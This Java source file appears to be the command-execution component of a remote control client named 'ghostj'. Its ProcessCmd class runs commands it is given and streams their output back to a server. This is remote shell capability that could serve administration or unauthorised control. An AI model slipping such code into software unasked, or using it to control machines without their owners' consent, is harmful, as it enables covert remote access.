package com.ghostj.client.core;


import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.util.Out;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.util.Date;

import static com.ghostj.client.func.FuncDefault.removeProcess;

/**
 * 一个命令行指令的执行对象
 * @author Rock Chin
 */
public class ProcessCmd extends Thread{
    /**
     * 创建时执行的命令
     */
    public String cmd="";
    public String name="";//进程名字，与processlist中的key对应
    public long startTime=0;//此进程创建时间
    /**
     * 指向执行对象
     */
    public Process process=null;
    /**
     * 向执行对象写数据
     */
    public BufferedWriter processWriter=null;//向process写数据
    /**
     * 读取命令执行时的error
     */
    public CmdError cmdError=null;

    /**
     * 初始化执行对象
     * @param name
     */
    public ProcessCmd(String name){
        this.name=name;
        startTime=new Date().getTime();
    }

    /**
     * 线程中执行
     */
    public void run(){
        try{
            /**
             * 获取命令执行对象
             */
            process=Runtime.getRuntime().exec(cmd);
            processWriter=new BufferedWriter(new OutputStreamWriter(process.getOutputStream(),"GBK"));
            /**
             * 获取执行对象的错误消息的线程
             */
            cmdError=new CmdError(new BufferedReader(new InputStreamReader(process.getErrorStream(),"GBK")));
            cmdError.start();
            Out.say("ProcessCmd","已启动err监听器");
            /**
             * 获取正常返回消息
             */
            InputStreamReader inputStreamReader=new InputStreamReader(process.getInputStream(),Charset.forName("GBK"));
            int len=0;
            while((len=inputStreamReader.read())!=-1){
                // FIXME: 2020/9/6 这里最好是加一个非聚焦执行对象暂时将输出信息保存到某处的逻辑
                // FIXME: 2020/9/6 加个缓存逻辑
                HandleConn.writeToServer(String.valueOf((char) len));
            }
        }catch (Exception e){
            Out.say("ProcessCmd","处理命令时出错.");
            try {
                HandleConn.writeToServer("处理命令时出现错误" +ClientMain.getErrorInfo(e));
            }catch (Exception ignored){}
        }finally {
            Out.say("ProcessCmd","命令已完成,索引已删除");
            removeProcess(name);
            try {
                HandleConn.writeToServer("\n命令已完成,process索引已自动删除\n");
            }catch (Exception e){}
            cmdError.stop();

        }
    }
}
